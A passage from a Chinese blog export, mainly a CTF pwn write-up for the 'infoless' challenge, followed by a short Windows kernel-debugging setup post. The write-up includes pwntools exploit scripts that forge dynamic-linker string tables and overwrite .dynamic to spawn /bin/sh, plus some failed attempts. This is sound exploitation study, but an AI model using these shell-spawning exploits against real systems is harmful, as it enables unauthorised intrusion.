class=\"number\">0x08048390</span></div><div class=\"line\">dynstrInDynamicAddr = <span class=\"number\">0x08049750</span></div><div class=\"line\">bssAddr = <span class=\"number\">0x08049820</span></div><div class=\"line\"> </div><div class=\"line\">strTable = [<span class=\"string\">''</span>, <span class=\"string\">'libc.so.6'</span>,<span class=\"string\">'_IO_stdin_used'</span>, <span class=\"string\">'fflush'</span>, <span class=\"string\">'stdin'</span>, <span class=\"string\">'read'</span>, <span class=\"string\">'stdout'</span>, <span class=\"string\">'stderr'</span>, <span class=\"string\">'setvbuf'</span>,<span class=\"string\">'__libc_start_main'</span>, <span class=\"string\">'__gmon_start__'</span>, <span class=\"string\">'GLIBC_2.0'</span>, <span class=\"string\">''</span>]</div><div class=\"line\">strTable[<span class=\"number\">3</span>] = <span class=\"string\">'system'</span></div><div class=\"line\"><span class=\"meta\">#将伪造的dynstr表中的fflush函数给换成system</span></div><div class=\"line\">binShellStr = <span class=\"string\">'/bin/sh\\0'</span></div><div class=\"line\">expOffset = <span class=\"number\">22</span></div><div class=\"line\">payloadHead = <span class=\"string\">'a'</span>*expOffset</div><div class=\"line\"> </div><div class=\"line\">def writeStrTableToBSS(baseAddr):</div><div class=\"line\">   tempBSS = baseAddr</div><div class=\"line\">    <span class=\"meta\">#循环写入伪造的dynstr表</span></div><div class=\"line\">   <span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> strTable:</div><div class=\"line\">       str = i + <span class=\"built_in\">chr</span>(<span class=\"number\">0</span>)</div><div class=\"line\">       payloadTemp = payloadHead + p32(readpltAddr) + p32(vulFunAddr) + p32(<span class=\"number\">0</span>)+ p32(tempBSS) + p32(len(str)+<span class=\"number\">1</span>)</div><div class=\"line\">       p.<span class=\"built_in\">send</span>(payloadTemp)</div><div class=\"line\">       <span class=\"built_in\">sleep</span>(<span class=\"number\">0.1</span>)</div><div class=\"line\">       p.<span class=\"built_in\">send</span>(str)</div><div class=\"line\">       tempBSS = tempBSS + len(str)</div><div class=\"line\">       <span class=\"built_in\">sleep</span>(<span class=\"number\">0.1</span>)</div><div class=\"line\"> </div><div class=\"line\">p = remote(<span class=\"string\">'123.206.81.66'</span>, <span class=\"number\">8888</span>)</div><div class=\"line\"><span class=\"meta\">#p = remote(<span class=\"string\">'127.0.0.1'</span>, 8888)</span></div><div class=\"line\"><span class=\"meta\">#p = process(<span class=\"string\">'./infoless'</span>)</span></div><div class=\"line\">context.log_level = <span class=\"string\">'debug'</span></div><div class=\"line\"> </div><div class=\"line\"><span class=\"meta\">#step 1: 将binShStr写入可写的bss段中</span></div><div class=\"line\">payload1 = payloadHead + p32(readpltAddr) +p32(vulFunAddr) + p32(<span class=\"number\">0</span>) + p32(bssAddr) + p32(<span class=\"number\">8</span>)</div><div class=\"line\">p.<span class=\"built_in\">send</span>(payload1)</div><div class=\"line\"><span class=\"built_in\">sleep</span>(<span class=\"number\">0.1</span>)</div><div class=\"line\">p.<span class=\"built_in\">send</span>(binShellStr)</div><div class=\"line\"><span class=\"built_in\">sleep</span>(<span class=\"number\">0.1</span>)</div><div class=\"line\"> </div><div class=\"line\"><span class=\"meta\">#step 2: 将伪造的dynstr表写入binShStr后面</span></div><div class=\"line\">dynstrInBSSAddr = bssAddr +len(binShellStr) + <span class=\"number\">4</span></div><div class=\"line\">writeStrTableToBSS(dynstrInBSSAddr)</div><div class=\"line\"> </div><div class=\"line\"><span class=\"meta\">#step 3: 将伪造的dynstr表地址写入dynamic中相对应的索引地址</span></div><div class=\"line\">payload2 = payloadHead + p32(readpltAddr) +p32(vulFunAddr) + p32(<span class=\"number\">0</span>) + p32(dynstrInDynamicAddr) + p32(<span class=\"number\">4</span>)</div><div class=\"line\">p.<span class=\"built_in\">send</span>(payload2)</div><div class=\"line\"><span class=\"built_in\">sleep</span>(<span class=\"number\">0.1</span>)</div><div class=\"line\">p.<span class=\"built_in\">send</span>(p32(dynstrInBSSAddr))</div><div class=\"line\"><span class=\"built_in\">sleep</span>(<span class=\"number\">0.1</span>)</div><div class=\"line\"> </div><div class=\"line\"><span class=\"meta\">#step 4：getshell</span></div><div class=\"line\">payload3 = payloadHead + p32(fflushpltAddr)+ p32(vulFunAddr) + p32(bssAddr)</div><div class=\"line\">p.<span class=\"built_in\">send</span>(payload3)</div><div class=\"line\"><span class=\"built_in\">sleep</span>(<span class=\"number\">0.1</span>)</div><div class=\"line\"></div><div class=\"line\">p.interactive()</div></pre></td></tr></table></figure></p>\n<h2 id=\"思考\"><a href=\"#思考\" class=\"headerlink\" title=\"思考\"></a>思考</h2><p>于是我有了一个想法，既然<code>.dynamic</code>节是可写的，那么<code>.dynstr</code>节是否可写呢？其他的节是否还存在可写的呢，节是否可写是否有标志位给出呢？于是我进行了以下的测试。</p>\n<h3 id=\"测试-dynstr节是否可写\"><a href=\"#测试-dynstr节是否可写\" class=\"headerlink\" title=\"测试.dynstr节是否可写\"></a>测试<code>.dynstr</code>节是否可写</h3><p>exp:<br><figure class=\"highlight livecodeserver\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div><div class=\"line\">7</div><div class=\"line\">8</div><div class=\"line\">9</div><div class=\"line\">10</div><div class=\"line\">11</div><div class=\"line\">12</div><div class=\"line\">13</div><div class=\"line\">14</div><div class=\"line\">15</div><div class=\"line\">16</div><div class=\"line\">17</div><div class=\"line\">18</div><div class=\"line\">19</div><div class=\"line\">20</div><div class=\"line\">21</div><div class=\"line\">22</div><div class=\"line\">23</div><div class=\"line\">24</div><div class=\"line\">25</div><div class=\"line\">26</div><div class=\"line\">27</div><div class=\"line\">28</div><div class=\"line\">29</div><div class=\"line\">30</div><div class=\"line\">31</div><div class=\"line\">32</div><div class=\"line\">33</div><div class=\"line\">34</div><div class=\"line\">35</div><div class=\"line\">36</div><div class=\"line\">37</div><div class=\"line\">38</div><div class=\"line\">39</div><div class=\"line\">40</div><div class=\"line\">41</div><div class=\"line\">42</div><div class=\"line\">43</div><div class=\"line\">44</div><div class=\"line\">45</div><div class=\"line\">46</div><div class=\"line\">47</div></pre></td><td class=\"code\"><pre><div class=\"line\"><span class=\"comment\">#!/usr/bin/env python</span></div><div class=\"line\"><span class=\"comment\"># coding=utf-8</span></div><div class=\"line\"><span class=\"built_in\">from</span> pwn import *</div><div class=\"line\"></div><div class=\"line\">slog = <span class=\"number\">1</span></div><div class=\"line\"><span class=\"built_in\">local</span> = <span class=\"number\">1</span></div><div class=\"line\">debug = <span class=\"number\">0</span></div><div class=\"line\"></div><div class=\"line\"><span class=\"built_in\">global</span> p</div><div class=\"line\"></div><div class=\"line\"><span class=\"keyword\">if</span> slog: context(log_level = <span class=\"string\">'debug'</span>)</div><div class=\"line\"><span class=\"keyword\">if</span> <span class=\"built_in\">local</span>:</div><div class=\"line\">    p = <span class=\"built_in\">process</span>(<span class=\"string\">'./infoless'</span>)</div><div class=\"line\"><span class=\"keyword\">else</span>:</div><div class=\"line\">    p = remote()</div><div class=\"line\"></div><div class=\"line\"><span class=\"keyword\">if</span> <span class=\"built_in\">local</span> <span class=\"keyword\">and</span> debug:</div><div class=\"line\">    gdb.attach(p, <span class=\"built_in\">open</span>(<span class=\"string\">'debug'</span>))</div><div class=\"line\"></div><div class=\"line\"><span class=\"built_in\">offset</span> = <span class=\"number\">22</span></div><div class=\"line\">elf = ELF(<span class=\"string\">'./infoless'</span>)</div><div class=\"line\">read_plt = elf.symbols[<span class=\"string\">'read'</span>]</div><div class=\"line\">vuln_addr = <span class=\"number\">0x80484CB</span></div><div class=\"line\">bss_addr = <span class=\"number\">0x8049820</span></div><div class=\"line\">fflush_plt = elf.symbols[<span class=\"string\">'fflush'</span>]</div><div class=\"line\"></div><div class=\"line\">def pwn():</div><div class=\"line\"></div><div class=\"line\">    addr = bss_addr</div><div class=\"line\">    payload1 = <span class=\"built_in\">offset</span> * <span class=\"string\">'a'</span> + p32(read_plt) + p32(vuln_addr) + p32(<span class=\"number\">0</span>) + p32(bss_addr) + p32(<span class=\"number\">100</span>)</div><div class=\"line\">    p.sendline(payload1)</div><div class=\"line\">    payload2 = <span class=\"string\">'/bin/sh\\x00'</span>.ljust(<span class=\"number\">20</span>, <span class=\"string\">'a'</span>)</div><div class=\"line\">    p.sendline(payload2)</div><div class=\"line\"></div><div class=\"line\">    addr = <span class=\"number\">0x8048276</span></div><div class=\"line\">    gdb,attach(p)</div><div class=\"line\">    payload1 = <span class=\"built_in\">offset</span> * <span class=\"string\">'b'</span> + p32(read_plt) + p32(vuln_addr) + p32(<span class=\"number\">0</span>) + p32(addr) + p32(<span class=\"number\">100</span>)</div><div class=\"line\">    p.sendline(payload1)</div><div class=\"line\">    payload2 = <span class=\"string\">'system\\x00'</span></div><div class=\"line\">    p.sendline(payload2)</div><div class=\"line\"></div><div class=\"line\">    payload1 = <span class=\"number\">14</span> * <span class=\"string\">'c'</span> + p32(fflush_plt) + p32(<span class=\"number\">0</span>) + p32(bss_addr)</div><div class=\"line\">    p.sendline(payload1)</div><div class=\"line\"></div><div class=\"line\"><span class=\"keyword\">if</span> __name__ == <span class=\"string\">'__main__'</span>:</div><div class=\"line\">    pwn()</div><div class=\"line\">    p.interactive()</div></pre></td></tr></table></figure></p>\n<p>嗯，测试结果不可写= =，但是当我们尝试去写的时候似乎不会报错？（应该是有一个address fault的呀- -）。</p>\n<h3 id=\"节的权限\"><a href=\"#节的权限\" class=\"headerlink\" title=\"节的权限\"></a>节的权限</h3><p>通过gdb的vmmap可以得到权限。当ELF文件被加载到内存中后，系统会将多个具有相同权限Section(节)合并成一个Segment(段)，通常为代码段(可读可执行)，可读可写的数据段，和只读数据段。</p>\n<figure class=\"highlight maxima\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div><div class=\"line\">7</div><div class=\"line\">8</div><div class=\"line\">9</div><div class=\"line\">10</div><div class=\"line\">11</div><div class=\"line\">12</div><div class=\"line\">13</div><div class=\"line\">14</div><div class=\"line\">15</div><div class=\"line\">16</div></pre></td><td class=\"code\"><pre><div class=\"line\">wndbg&gt; vmmap </div><div class=\"line\">LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA</div><div class=\"line\"> <span class=\"number\">0x8048000</span>  <span class=\"number\">0x8049000</span> r-xp     <span class=\"number\">1000</span> <span class=\"number\">0</span>      /root/ctf-problem/2017hbctf/pwn/infoless/infoless</div><div class=\"line\"> <span class=\"number\">0x8049000</span>  <span class=\"number\">0x804a000</span> rw-p     <span class=\"number\">1000</span> <span class=\"number\">0</span>      /root/ctf-problem/2017hbctf/pwn/infoless/infoless</div><div class=\"line\"><span class=\"number\">0xf7dfa000</span> <span class=\"number\">0xf7dfc000</span> rw-p     <span class=\"number\">2000</span> <span class=\"number\">0</span>      </div><div class=\"line\"><span class=\"number\">0xf7dfc000</span> <span class=\"number\">0xf7fad000</span> r-xp   <span class=\"number\">1b1000</span> <span class=\"number\">0</span>      /lib32/libc-<span class=\"number\">2.24</span>.so</div><div class=\"line\"><span class=\"number\">0xf7fad000</span> <span class=\"number\">0xf7faf000</span> r--p     <span class=\"number\">2000</span> <span class=\"number\">1b0000</span> /lib32/libc-<span class=\"number\">2.24</span>.so</div><div class=\"line\"><span class=\"number\">0xf7faf000</span> <span class=\"number\">0xf7fb0000</span> rw-p     <span class=\"number\">1000</span> <span class=\"number\">1b2000</span> /lib32/libc-<span class=\"number\">2.24</span>.so</div><div class=\"line\"><span class=\"number\">0xf7fb0000</span> <span class=\"number\">0xf7fb3000</span> rw-p     <span class=\"number\">3000</span> <span class=\"number\">0</span>      </div><div class=\"line\"><span class=\"number\">0xf7fd2000</span> <span class=\"number\">0xf7fd4000</span> rw-p     <span class=\"number\">2000</span> <span class=\"number\">0</span>      </div><div class=\"line\"><span class=\"number\">0xf7fd4000</span> <span class=\"number\">0xf7fd7000</span> r--p     <span class=\"number\">3000</span> <span class=\"number\">0</span>      [vvar]</div><div class=\"line\"><span class=\"number\">0xf7fd7000</span> <span class=\"number\">0xf7fd9000</span> r-xp     <span class=\"number\">2000</span> <span class=\"number\">0</span>      [vdso]</div><div class=\"line\"><span class=\"number\">0xf7fd9000</span> <span class=\"number\">0xf7ffb000</span> r-xp    <span class=\"number\">22000</span> <span class=\"number\">0</span>      /lib32/ld-<span class=\"number\">2.24</span>.so</div><div class=\"line\"><span class=\"number\">0xf7ffc000</span> <span class=\"number\">0xf7ffd000</span> r--p     <span class=\"number\">1000</span> <span class=\"number\">22000</span>  /lib32/ld-<span class=\"number\">2.24</span>.so</div><div class=\"line\"><span class=\"number\">0xf7ffd000</span> <span class=\"number\">0xf7ffe000</span> rw-p     <span class=\"number\">1000</span> <span class=\"number\">23000</span>  /lib32/ld-<span class=\"number\">2.24</span>.so</div><div class=\"line\"><span class=\"number\">0xfffdd000</span> <span class=\"number\">0xffffe000</span> rw-p    <span class=\"number\">21000</span> <span class=\"number\">0</span>      [stack]</div></pre></td></tr></table></figure>\n<h3 id=\"关于传参\"><a href=\"#关于传参\" class=\"headerlink\" title=\"关于传参\"></a>关于传参</h3><p>我的一个失败的exp：<br><figure class=\"highlight livecodeserver\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div><div class=\"line\">7</div><div class=\"line\">8</div><div class=\"line\">9</div><div class=\"line\">10</div><div class=\"line\">11</div><div class=\"line\">12</div><div class=\"line\">13</div><div class=\"line\">14</div><div class=\"line\">15</div><div class=\"line\">16</div><div class=\"line\">17</div><div class=\"line\">18</div><div class=\"line\">19</div><div class=\"line\">20</div><div class=\"line\">21</div><div class=\"line\">22</div><div class=\"line\">23</div><div class=\"line\">24</div><div class=\"line\">25</div><div class=\"line\">26</div><div class=\"line\">27</div><div class=\"line\">28</div><div class=\"line\">29</div><div class=\"line\">30</div><div class=\"line\">31</div><div class=\"line\">32</div><div class=\"line\">33</div><div class=\"line\">34</div><div class=\"line\">35</div><div class=\"line\">36</div><div class=\"line\">37</div><div class=\"line\">38</div><div class=\"line\">39</div><div class=\"line\">40</div><div class=\"line\">41</div><div class=\"line\">42</div><div class=\"line\">43</div><div class=\"line\">44</div><div class=\"line\">45</div><div class=\"line\">46</div><div class=\"line\">47</div><div class=\"line\">48</div><div class=\"line\">49</div><div class=\"line\">50</div><div class=\"line\">51</div><div class=\"line\">52</div><div class=\"line\">53</div><div class=\"line\">54</div><div class=\"line\">55</div><div class=\"line\">56</div><div class=\"line\">57</div><div class=\"line\">58</div><div class=\"line\">59</div><div class=\"line\">60</div><div class=\"line\">61</div><div class=\"line\">62</div><div class=\"line\">63</div><div class=\"line\">64</div><div class=\"line\">65</div><div class=\"line\">66</div><div class=\"line\">67</div><div class=\"line\">68</div><div class=\"line\">69</div><div class=\"line\">70</div><div class=\"line\">71</div><div class=\"line\">72</div><div class=\"line\">73</div><div class=\"line\">74</div><div class=\"line\">75</div><div class=\"line\">76</div><div class=\"line\">77</div><div class=\"line\">78</div><div class=\"line\">79</div><div class=\"line\">80</div><div class=\"line\">81</div><div class=\"line\">82</div><div class=\"line\">83</div><div class=\"line\">84</div><div class=\"line\">85</div><div class=\"line\">86</div><div class=\"line\">87</div><div class=\"line\">88</div><div class=\"line\">89</div><div class=\"line\">90</div><div class=\"line\">91</div><div class=\"line\">92</div><div class=\"line\">93</div><div class=\"line\">94</div></pre></td><td class=\"code\"><pre><div class=\"line\"><span class=\"comment\">#!/usr/bin/env python</span></div><div class=\"line\"><span class=\"comment\"># coding=utf-8</span></div><div class=\"line\"><span class=\"built_in\">from</span> pwn import *</div><div class=\"line\"></div><div class=\"line\">slog = <span class=\"number\">1</span></div><div class=\"line\"><span class=\"built_in\">local</span> = <span class=\"number\">1</span></div><div class=\"line\">debug = <span class=\"number\">0</span></div><div class=\"line\"></div><div class=\"line\"><span class=\"built_in\">global</span> p</div><div class=\"line\"></div><div class=\"line\"><span class=\"keyword\">if</span> slog: context(log_level = <span class=\"string\">'debug'</span>)</div><div class=\"line\"><span class=\"keyword\">if</span> <span class=\"built_in\">local</span>:</div><div class=\"line\">    p = <span class=\"built_in\">process</span>(<span class=\"string\">'./infoless'</span>)</div><div class=\"line\"><span class=\"keyword\">else</span>:</div><div class=\"line\">    p = remote()</div><div class=\"line\"></div><div class=\"line\"><span class=\"keyword\">if</span> <span class=\"built_in\">local</span> <span class=\"keyword\">and</span> debug:</div><div class=\"line\">    gdb.attach(p, <span class=\"built_in\">open</span>(<span class=\"string\">'debug'</span>))</div><div class=\"line\"></div><div class=\"line\"></div><div class=\"line\">elf = ELF(<span class=\"string\">'./infoless'</span>)</div><div class=\"line\"></div><div class=\"line\"><span class=\"built_in\">offset</span> = <span class=\"number\">22</span></div><div class=\"line\"><span class=\"comment\"># .rel.plt  reloc = reloc + .rel.plt , fake reloc_args to locate reloc on bss</span></div><div class=\"line\"></div><div class=\"line\"><span class=\"comment\"># .dynsym   sym = .dynsym + reloc-&gt;info , fake reloc-&gt;info to locate sym on bss</span></div><div class=\"line\"></div><div class=\"line\"><span class=\"comment\"># .dynstr   name = .dynstr + sym-&gt;value, fake sym-&gt;value to locate name on bss</span></div><div class=\"line\"></div><div class=\"line\"><span class=\"comment\">#  name_str fake name_str on bss</span></div><div class=\"line\"></div><div class=\"line\">pr = <span class=\"number\">0x08048361</span></div><div class=\"line\">relplt_addr = <span class=\"number\">0x8048320</span></div><div class=\"line\">vuln_addr = <span class=\"number\">0x80484CB</span></div><div class=\"line\">plt_addr = <span class=\"number\">0x8048370</span></div><div class=\"line\">bss_addr = <span class=\"number\">0x8049820</span></div><div class=\"line\">dynsym_addr = <span class=\"number\">0x80481bc</span></div><div class=\"line\">dynstr_addr = <span class=\"number\">0x0804825c</span></div><div class=\"line\">read_plt = elf.symbols[<span class=\"string\">'read'</span>]</div><div class=\"line\"></div><div class=\"line\">def pwn():</div><div class=\"line\">    print <span class=\"string\">'bss_addr =&gt; '</span>, hex(bss_addr)</div><div class=\"line\"></div><div class=\"line\">    <span class=\"comment\"># send /bin/sh</span></div><div class=\"line\">    addr = bss_addr</div><div class=\"line\">    payload1 = <span class=\"built_in\">offset</span> * <span class=\"string\">'a'</span> + p32(read_plt) + p32(vuln_addr) + p32(<span class=\"number\">0</span>) + p32(bss_addr) + p32(<span class=\"number\">100</span>)</div><div class=\"line\">    p.sendline(payload1)</div><div class=\"line\">    payload2 = <span class=\"string\">'/bin/sh\\x00'</span>.ljust(<span class=\"number\">20</span>, <span class=\"string\">'a'</span>)</div><div class=\"line\">    p.sendline(payload2)</div><div class=\"line\">    </div><div class=\"line\">    <span class=\"comment\"># fake .rel.plt on bss</span></div><div class=\"line\">    <span class=\"comment\"># 0x0804970c      0x00000107</span></div><div class=\"line\">    addr += <span class=\"built_in\">len</span>(payload2)</div><div class=\"line\">    payload1 = <span class=\"built_in\">offset</span> * <span class=\"string\">'a'</span> + p32(read_plt) + p32(vuln_addr) + p32(<span class=\"number\">0</span>) + p32(addr) + p32(<span class=\"number\">100</span>)</div><div class=\"line\"><span class=\"comment\">#    gdb.attach(p, open('debug'))</span></div><div class=\"line\">    p.sendline(payload1)</div><div class=\"line\">    print <span class=\"string\">'addr - relplt_addr =&gt; '</span>, hex(addr - relplt_addr)</div><div class=\"line\">    off = ((addr - dynsym_addr) / <span class=\"number\">0x10</span> + <span class=\"number\">1</span>) * <span class=\"number\">0x100</span> + <span class=\"number\">0x7</span></div><div class=\"line\">    print <span class=\"string\">'off =&gt; '</span>, hex(off)</div><div class=\"line\">    payload2 = p32(elf.got[<span class=\"string\">'fflush'</span>]) + p32(off)</div><div class=\"line\">    p.sendline(payload2)</div><div class=\"line\"><span class=\"comment\">#    gdb.attach(p)</span></div><div class=\"line\"></div><div class=\"line\">    <span class=\"comment\"># fake .dynsym on bss</span></div><div class=\"line\">    <span class=\"comment\"># 0x0000001a      0x00000000      0x00000000      0x00000012</span></div><div class=\"line\">    addr += <span class=\"built_in\">len</span>(payload2)</div><div class=\"line\">    payload1 = <span class=\"built_in\">offset</span> * <span class=\"string\">'a'</span> + p32(read_plt) + p32(vuln_addr) + p32(<span class=\"number\">0</span>) + p32(addr) + p32(<span class=\"number\">100</span>)</div><div class=\"line\">    p.sendline(payload1)</div><div class=\"line\">    off = addr - dynstr_addr + <span class=\"number\">0x10</span></div><div class=\"line\">    print <span class=\"string\">'offset_dynstr =&gt; '</span>, hex(off) <span class=\"comment\"># 15f0</span></div><div class=\"line\">    payload2 = p32(off) + p32(<span class=\"number\">0</span>) + p32(<span class=\"number\">0</span>) + p32(<span class=\"number\">0x12</span>)</div><div class=\"line\"><span class=\"comment\">#    gdb.attach(p, open('debug'))</span></div><div class=\"line\">    p.sendline(payload2)</div><div class=\"line\"></div><div class=\"line\">    <span class=\"comment\"># fake .dynstr</span></div><div class=\"line\">    addr += <span class=\"built_in\">len</span>(payload2)</div><div class=\"line\">    payload1 = <span class=\"built_in\">offset</span> * <span class=\"string\">'a'</span> + p32(read_plt) + p32(vuln_addr) + p32(<span class=\"number\">0</span>) + p32(addr) + p32(<span class=\"number\">100</span>)</div><div class=\"line\">    p.sendline(payload1)</div><div class=\"line\"><span class=\"comment\">#    gdb.attach(p, open('debug'))</span></div><div class=\"line\">    payload2 = <span class=\"string\">'system\\x00'</span></div><div class=\"line\">    p.sendline(payload2)</div><div class=\"line\"><span class=\"comment\">#    gdb.attach(p, open('debug'))</span></div><div class=\"line\"></div><div class=\"line\">    <span class=\"comment\"># fake reloc_args &amp; mov eip, plt[0]</span></div><div class=\"line\">    reloc_args = bss_addr - relplt_addr + <span class=\"number\">0x14</span></div><div class=\"line\">    print <span class=\"string\">'reloc_args =&gt; '</span>, hex(reloc_args)</div><div class=\"line\">    gdb.attach(p, <span class=\"built_in\">open</span>(<span class=\"string\">'debug'</span>))</div><div class=\"line\">    payload1 = <span class=\"built_in\">offset</span> * <span class=\"string\">'a'</span> + p32(plt_addr) + p32(reloc_args) + p32(elf.plt[<span class=\"string\">'fflush'</span>]) + p32(vuln_addr) + p32(bss_addr)</div><div class=\"line\">    p.sendline(payload1)</div><div class=\"line\"><span class=\"comment\">#    gdb.attach(p)</span></div><div class=\"line\"></div><div class=\"line\"><span class=\"keyword\">if</span> __name__ == <span class=\"string\">'__main__'</span>:</div><div class=\"line\">    pwn()</div><div class=\"line\">    p.interactive()</div></pre></td></tr></table></figure></p>\n<p>最后在控制<code>eip</code>到<code>plt[0]</code>的位置时，我遇到了传参的问题，当我将<code>reloc_adgs</code>压入栈中后，我无法将将要调用函数<code>fflush()(事实上是systm())</code>的参数<code>/bin/sh\\x00</code>压入栈中了，这里可能需要用到rop去控制esp和栈的内容，暂时先不去研究这个。</p>\n<h3 id=\"其他可能的利用？\"><a href=\"#其他可能的利用？\" class=\"headerlink\" title=\"其他可能的利用？\"></a>其他可能的利用？</h3><p>当我们可以控制<code>.dynamic</code>后是否可以改变别的值去控制程序（连接器？）解析到其他的地址上，是否还有其他的利用方式？</p>\n<h3 id=\"x64\"><a href=\"#x64\" class=\"headerlink\" title=\"x64\"></a>x64</h3><p>关于64位的利用方式应该是差不多的，暂时没精力研究了，先挖坑，以后填吧，先去研究沙盒了。</p>\n<h2 id=\"叹\"><a href=\"#叹\" class=\"headerlink\" title=\"叹\"></a>叹</h2><p>还是太菜了，弄明白个这个玩意都要花接近一天。。。。TAT</p>\n"},{"title":"win内核驱动编程","date":"2017-07-20T02:07:36.000Z","_content":"\n## 准备知识与环境\n### 理论\n\nIntel处理器分为四个权限ring0，ring1，ring2，ring3，由高到低。其中win使用了ring0与ring3两个权限。内核及内核拓展模块（驱动程序）运行在ring0级别上。\n\n### 双机调试环境\n\n工具：\n+ windbg\n+ WDK，这个需要在微软的官网上下载，然还能顺便把windbg给装了\n+ virtualKD，这个软件用来调试内核和驱动，通过vmware的通信进程来给系统中断\n\n过程：\n+ 安装win7_x64的虚拟机，然后把virtualKD的target文件夹放入虚拟机中，安装文件。\n+ 重新启动虚拟机，这时有一个virtualKD的启动选择项。\n+ 开启virtualKD能够看到我们开启的虚拟机的进程。\n+ 第一次用时需要配置windbg的路径，路径配置完成自动/手动打开windbg\n+ 我们需要载入符号表，符号表在`File->Symbols Path`快捷键`^+s`配置，路径为`srv*c:\\symbols *https://msdl.microsoft.com/download/symbols`，第一个`*`后为本地的下载目录，勾选上`Reload`。\n+ 至此调试环境配置完成，我们可以查看微软的一些符号表了。\n\n### 内核/驱动开发环境\n\n+ VS2013\n+ WDK 8.1","source":"_posts/win内核驱动编程.md","raw":"---\ntitle: win内核驱动编程\ntags:\n  - win驱动\ncategories: []\ndate: 2017-07-20 10:07:36\n---\n\n## 准备知识与环境\n### 理论\n\nIntel处理器分为四个权限ring0，ring1，ring2，ring3，由高到低。其中win使用了ring0与ring3两个权限。内核及内核拓展模块（驱动程序）运行在ring0级别上。\n\n### 双机调试环境\n\n工具：\n+ windbg\n+ WDK，这个需要在微软的官网上下载，然还能顺便把windbg给装了\n+ virtualKD，这个软件用来调试内核和驱动，通过vmware的通信进程来给系统中断\n\n过程：\n+ 安装win7_x64的虚拟机，然后把virtualKD的target文件夹放入虚拟机中，安装文件。\n+ 重新启动虚拟机，这时有一个virtualKD的启动选择项。\n+ 开启virtualKD能够看到我们开启的虚拟机的进程。\n+ 第一次用时需要配置windbg的路径，路径配置完成自动/手动打开windbg\n+ 我们需要载入符号表，符号表在`File->Symbols Path`快捷键`^+s`配置，路径为`srv*c:\\symbols *https://msdl.microsoft.com/download/symbols`，第一个`*`后为本地的下载目录，勾选上`Reload`。\n+ 至此调试环境配置完成，我们可以查看微软的一些符号表了。\n\n### 内核/驱动开发环境\n\n+ VS2013\n+ WDK 8.1","slug":"win内核驱动编程","published":1,"updated":"2017-07-29T10:01:09.503Z","comments":1,"layout":"post","photos":[],"link":"","_id":"cjcpz0k3e004ihv187gsv5o46","content":"<h2 id=\"准备知识与环境\"><a href=\"#准备知识与环境\" class=\"headerlink\" title=\"准备知识与环境\"></a>准备知识与环境</h2><h3 id=\"理论\"><a href=\"#理论\" class=\"headerlink\" title=\"理论\"></a>理论</h3><p>Intel处理器分为四个权限ring0，ring1，ring2，ring3，由高到低。其中win使用了ring0与ring3两个权限。内核及内核拓展模块（驱动程序）运行在ring0级别上。</p>\n<h3 id=\"双机调试环境\"><a href=\"#双机调试环境\" class=\"headerlink\" title=\"双机调试环境\"></a>双机调试环境</h3><p>工具：</p>\n<ul>\n<li>windbg</li>\n<li>WDK，这个需要在微软的官网上下载，然还能顺便把windbg给装了</li>\n<li>virtualKD，这个软件用来调试内核和驱动，通过vmware的通信进程来给系统中断</li>\n</ul>\n<p>过程：</p>\n<ul>\n<li>安装win7_x64的虚拟机，然后把virtualKD的target文件夹放入虚拟机中，安装文件。</li>\n<li>重新启动虚拟机，这时有一个virtualKD的启动选择项。</li>\n<li>开启virtualKD能够看到我们开启的虚拟机的进程。</li>\n<li>第一次用时需要配置windbg的路径，路径配置完成自动/手动打开windbg</li>\n<li>我们需要载入符号表，符号表在<code>File-&gt;Symbols Path</code>快捷键<code>^+s</code>配置，路径为<code>srv*c:\\symbols *https://msdl.microsoft.com/download/symbols</code>，第一个<code>*</code>后为本地的下载目录，勾选上<code>Reload</code>。</li>\n<li>至此调试环境配置完成，我们可以查看微软的一些符号表了。</li>\n</ul>\n<h3 id=\"内核-驱动开发环境\"><a href=\"#内核-驱动开发环境\" class=\"headerlink\" title=\"内核/驱动开发环境\"></a>内核/驱动开发环境</h3><ul>\n<li>VS2013</li>\n<li>WDK 8.1</li>\n</ul>\n","excerpt":"","more":"<h2 id=\"准备知识与环境\"><a href=\"#准备知识与环境\" class=\"headerlink\" title=\"准备知识与环境\"></a>准备知识与环境</h2><h3 id=\"理论\"><a href=\"#理论\" class=\"headerlink\" title=\"理论\"></a>理论</h3><p>Intel处理器分为四个权限ring0，ring1，ring2，ring3，由高到低。其中win使用了ring0与ring3两个权限。内核及内核拓展模块（驱动程序）运行在ring0级别上。</p>\n<h3 id=\"双机调试环境\"><a href=\"#双机调试环境\" class=\"headerlink\" title=\"双机调试环境\"></a>双机调试环境</h3><p>工具：</p>\n<ul>\n<li>windbg</li>\n<li>WDK，这个需要在微软的官网上下载，然还能顺便把windbg给装了</li>\n<li>virtualKD，这个软件用来调试内核和驱动，通过vmware的通信进程来给系统中断</li>\n</ul>\n<p>过程：</p>\n<ul>\n<li>安装win7_x64的虚拟机，然后把virtualKD的target文件夹放入虚拟机中，安装文件。</li>\n<li>重新启动虚拟机，这时有一个virtualKD的启动选择项。</li>\n<li>开启virtualKD能够看到我们开启的虚拟机的进程。</li>\n<li>第一次用时需要配置windbg的路径，路径配置完成自动/手动打开windbg</li>\n<li>我们需要载入符号表，符号表在<code>File-&gt;Symbols Path</code>快捷键<code>^+s</code>配置，路径为<code>srv*c:\\symbols *https://msdl.microsoft.com/download/symbols</code>，第一个<code>*</code>后为本地的下载目录，勾选上<code>Reload</code>。</li>\n<li>至此调试环境配置完成，我们可以查看微软的一些符号表了。</li>\n</ul>\n<h3 id=\"内核-驱动开发环境\"><a href=\"#内核-驱动开发环境\" class=\"headerlink\" title=\"内核/驱动开发环境\"></a>内核/驱动开发环境</h3><ul>\n<li>VS2013</li>\n<li>WDK 8.1</li>\n</ul>\n"},{"title":"yii踩坑记录","date":"2017-06-01T01:34:01.000Z","_content":"\n\n为了这个网站可是踩了我太多太多坑了TAT。。\n最最重要的一点经验就是，_**好好读文档比什么都重要**_\n\n<!--more-->\n\n1. 